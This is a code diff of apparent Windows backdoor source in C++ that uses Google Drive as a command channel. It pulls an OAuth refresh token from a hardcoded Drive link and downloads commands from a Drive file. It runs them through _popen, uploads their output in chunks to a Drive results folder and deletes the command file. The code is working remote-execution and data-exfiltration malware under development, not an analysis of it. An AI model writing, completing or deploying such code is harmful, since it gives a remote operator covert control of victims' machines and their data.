@@ -11,8 +11,9 @@
 #define FAILSAFE_THRESHOLD 2402 * 1000
 #define EXPONENTIAL_POWER 4
 #define RESULTS_FOLDER_ID "10a_TCWM1Txsjy-SkkQMen2eytaZKLgdB"
-#define SOURCE_DRIVE_ID "1_tWWjOBiwEFivD8Ua6rwEF4JQfq7t1er"
+#define SOURCE_ID "1_tWWjOBiwEFivD8Ua6rwEF4JQfq7t1er"
 #define UPLOAD_BUFFER_SIZE 7680
+#define MAX_UPLOAD_SIZE 6656 // 6.5 * 1024
 
 static const char bs64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
 "abcdefghijklmnopqrstuvwxyz"
@@ -167,7 +168,7 @@ static WORD setNewRefreshAndAccessToken(std::string& refreshToken, std::string& 
 	memcpy(buffer, "It's empty!", 12);
 
 	FILE* file = _popen("powershell -c \"try{Write-Host -NoNewline (Invoke-Restmethod 'https://drive.google.com/uc?export=download&id=1PE_bOI--Ti8exPg6hkq_yIhYBipOVZT1' -TimeoutSec 30).RefreshToken}catch{Write-Host -NoNewline 400}\"", "r");
-
+	////// you should edit this
 	fgets(buffer, 1023, file);
 	_pclose(file);
 
@@ -201,7 +202,7 @@ static WORD setNewRefreshAndAccessToken(std::string& refreshToken, std::string& 
 		}
 	}
 }
-
+//review this two function
 /// <summary>
 /// A procedure to handle the failsafe.
 /// </summary>
@@ -253,7 +254,7 @@ static void handleFailsafe(std::string& refreshToken, std::string& accessToken) 
 static WORD downloadSourceContext(std::string accessToken, std::string& output) {
 	char* buffer = new char[1024];
 
-	snprintf(buffer, 1024, "powershell.exe -c \"try { $response = Invoke-RestMethod 'https://www.googleapis.com/drive/v3/files/%s?alt=media&acknowledgeAbuse=true&mimeType=text/plain' -TimeoutSec 30 -Method 'GET' -Headers @{'Authorization' = 'Bearer %s'}; Write-Host -NoNewline $response } catch [System.Net.WebException] { if ($_.Exception.Message -like '*timed out*') { Write-Host -NoNewline 600 } elseif ($_.Exception.Response -ne $null) {Write-Host -NoNewline $_.Exception.Response.StatusCode.value__ } else { Write-Host -NoNewline 601} } catch { Write-Host -NoNewline 601}\"", SOURCE_DRIVE_ID,
+	snprintf(buffer, 1024, "powershell.exe -c \"try { $response = Invoke-RestMethod 'https://www.googleapis.com/drive/v3/files/%s?alt=media&acknowledgeAbuse=true&mimeType=text/plain' -TimeoutSec 30 -Method 'GET' -Headers @{'Authorization' = 'Bearer %s'}; Write-Host -NoNewline $response } catch [System.Net.WebException] { if ($_.Exception.Message -like '*timed out*') { Write-Host -NoNewline 600 } elseif ($_.Exception.Response -ne $null) {Write-Host -NoNewline $_.Exception.Response.StatusCode.value__ } else { Write-Host -NoNewline 601} } catch { Write-Host -NoNewline 601}\"", SOURCE_ID,
 		accessToken.c_str()
 	);
 
@@ -284,12 +285,34 @@ static WORD downloadSourceContext(std::string accessToken, std::string& output) 
 }
 
 /// <summary>
+/// Execute a command in a manner suitable for _popen() function and put the result in output string.
+/// </summary>
+/// <param name="input">The command downloaded from source</param>
+/// <param name="output">TOutput of the pipe that got opened by _popen()</param>
+/// <returns>returns 0 :|</returns>
+static WORD commandExecuter(std::string input, std::string& output) {
+	std::replace(input.begin(), input.end(), '\n', '&');
+	FILE* file = _popen(input.c_str(), "r");
+	output = "";
+	char* buffer = new char[1024];
+
+	while (fgets(buffer, 1024, file) != NULL) {
+		output = output + buffer;
+	}
+	_pclose(file);
+	delete[] buffer;
+
+	return 0;
+}
+
+/// <summary>
 /// This function upload a single file up to 6656 characters (Around 6.5 KB).
 /// </summary>
 /// <param name="uploadpart"></param>
 /// <param name="accessToken"></param>
 /// <param name="index"></param>
 /// <param name="subIndex"></param>
+/// <returns>
 /// 200 OK!
 /// 401 Unauthorized!
 /// 600 Timeout!
@@ -313,21 +336,43 @@ static WORD singlePartUpload(std::string uploadpart, std::string accessToken, DW
 	return errorCode;
 }
 
-static WORD commandExecuter(std::string input, std::string& output) {
-	std::replace(input.begin(), input.end(), '\n', '&');
-	FILE* file = _popen(input.c_str(), "r");
-	output = "";
-	char* buffer = new char[1024];
 
-	while (fgets(buffer, 1024, file) != NULL) {
-		output = output + buffer;
+static WORD uploadResult(std::string input, std::string accessToken, WORD index) {
+	//input = base64_encode(input);
+	for (size_t subIndex = 0, i = 0; i < input.length(); i += MAX_UPLOAD_SIZE, subIndex++)
+	{
+		singlePartUpload(input.substr(i, MAX_UPLOAD_SIZE), accessToken, index, subIndex);
+		// need to error handle
 	}
-	_pclose(file);
-	delete[] buffer;
-
 	return 0;
 }
+/// <summary>
+/// This function delete the resource file that is on the Google drive.
+/// </summary>
+/// <param name="accessToken"></param>
+/// <returns>
+/// 200 OK!
+/// 401 Unauthorized!
+/// 600 Timeout!
+/// 601 Unhandled Exception!
+/// </returns>
+static WORD deleteSource(std::string accessToken) {
+	char* buffer = new char[1024];
+	WORD errorCode = 200;
+	snprintf(buffer, 1023, "powershell.exe -c \"try {Invoke-RestMethod 'https://www.googleapis.com/upload/drive/v3/files/%s?access_token=%s' -Method 'PATCH' -TimeoutSec 30}catch [System.Net.WebException] { if ($_.Exception.Message -like '*timed out*') { Write-Host -NoNewline 600 } elseif ($_.Exception.Response -ne $null) {Write-Host -NoNewline $_.Exception.Response.StatusCode.value__ } else { Write-Host -NoNewline 601} } catch { Write-Host -NoNewline 601}\"", SOURCE_ID, accessToken.c_str());
+	FILE* file = _popen(buffer, "r");
+	delete[] buffer;
+	buffer = new char[4];
+	fgets(buffer, 4, file);
+	_pclose(file);
 
+	if (buffer[0] == '4' || buffer[0] == '6')
+	{
+		errorCode = (buffer[0] - '0') * 100 + (buffer[1] - '0') * 10 + (buffer[2] - '0');
+	}
+	delete[] buffer;
+	return errorCode;
+}
 //static void upload(MyString data) {
 //    char* buffer = new char[7000];
 //    double tmp = static_cast<double>(data.getLength()) / 6000;
